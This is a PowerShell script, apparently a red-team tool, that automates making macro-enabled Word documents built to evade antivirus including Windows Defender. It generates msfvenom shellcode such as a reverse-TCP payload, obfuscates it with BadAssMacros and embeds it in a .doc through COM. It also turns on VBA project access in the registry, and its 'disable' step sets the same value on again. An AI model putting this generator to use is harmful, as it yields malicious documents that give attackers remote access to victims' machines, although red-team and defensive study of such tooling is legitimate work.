function Invoke-Vulcan {
    <#
    .SYNOPSIS
        Automate the creation of macro-enabled Word documents that - at the time of writing - evades most AVs, including Windows Defender.

        Author: Alexandre Teyar (@aress31)
        License: BSD 3-Clause
        Required Dependencies: Windows Subsystem for Linux (WSL), BadAssMacros
        Optional Dependencies: None

    .DESCRIPTION
        Using MSFVenom and BadAssMacros, creates a macro-enabled Word document that - at the time
        of writing - evade most AVs, including Windows Defender.
        
    .PARAMETER BadAssMacros
        Specifies the path to the BadAssMacro executable.

    .PARAMETER OutputDirectory
        Folder to output files too.
    
    .PARAMETER OutputPrefix
        Prefix to add to output files.

    .PARAMETER Payload
        Specifies the MSFVenom payload to use.

    .PARAMETER PayloadOptions
        Specifies the options to use to generate the MSFVenom shellcode.    

    .EXAMPLE
        PS C:\> Invoke-Vulcan -BadAssMacros "C:\Users\aress31\GitHub\BadAssMacros\BadAssMacrosx64.exe" -Payload "windows/pingback_reverse_tcp" -PayloadOptions "LHOST=192.168.0.24 LPORT=4444 EXITFUNC=thread"

        Executes MSFVenom with the specified payload and options, pass the generated raw shellcode to BadAssMacros to obfuscate it in order to evade AVs,
        and then removes creates an empty macro-enabled Word document containing the processed macro.
    #>

    [CmdletBinding(PositionalBinding = $false)]
    param(
        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $BadAssMacros,

        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        [String]
        $OutputDirectory = $(Get-Location),

        [String]
        $OutputPrefix = "vulcan",

        [Parameter(Mandatory)]
        [String]
        $Payload,

        [Parameter(Mandatory)]
        [String]
        $PayloadOptions
    )

    begin {
        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).bin"
        $BAMOutput = "${env:TEMP}\badassmacros_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).vba"
        
        $Match = $payloadOptions | Select-String -Pattern "LHOST=(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})"
        $LHOST = $match.matches.groups[1].Value
        $Match = $PayloadOptions | Select-String -Pattern "LPORT=(\d{1,3}\b)"
        $LPORT = $match.matches.groups[1].Value
        
        Resolve-Path `
            -Path $(Join-Path -Path $OutputDirectory "$($Payload.Replace('/', '.')).${LHOST}-${LPORT}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
            -ErrorAction SilentlyContinue -ErrorVariable _frperror

        $WordOutput = $_frperror[0].TargetObject

        Write-Output "[+] Enabling trust access to VBA Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }

    process {
        Create_Payload -Payload $Payload -PayloadOptions $PayloadOptions -PayloadOutput $PayloadOutput
        Create_VBAMacro -BAMBin $BadAssMacros -BAMInput $PayloadOutput -BAMOutput $BAMOutput
        Create_WordDocument -BAMOutput $BAMOutput -Output $WordOutput
    }

    end {
        Write-Host "[-] Removing payload file..."
        Remove-Item -Path $PayloadOutput -Force
        Write-Host "[-] Removing VBA macro file..."
        Remove-Item -Path $BAMOutput -Force
        
        Write-Output "[+] Disabling trust access to VBA Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }
}

function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
    Write-Host "[i] Creating payload..."
    $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
    $Command = "wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath"

    Write-Host "[i] Running command: $Command"
    Invoke-Expression -Command $Command | Out-Null
    Write-Host "[i] Payload written to: $PayloadOutput"
}

function Create_VBAMacro($BAMBin, $BAMInput, $BAMOutput) {
    Write-Host "[i] Creating VBA macro..."
    $CaesarShift = Get-Random -Minimum 1 -Maximum 25
    $Command = "$BAMBin -w doc -p no -s indirect -c $CaesarShift -i $BAMInput -o $BAMOutput"

    Write-Host "[i] Running command: $Command"
    Invoke-Expression -Command $Command | Out-Null
    Write-Host "[i] VBA macro written to: $BAMOutput"
}

function Create_WordDocument($BAMOutput, $Output) {
    Write-Host "[i] Creating macro-enabled Word document..."
    $Word = New-Object -ComObject Word.Application
    $Doc = $Word.Documents.Add()

    $DocModule = $Doc.VBProject.VBComponents.Add(1)
    $DocModule.CodeModule.AddFromFile($BAMOutput)

    Write-Host "[+] Word document written to: $Output" 
    $Doc.SaveAs($Output, 0)

    $Doc.Close()
    $Word.Quit()
}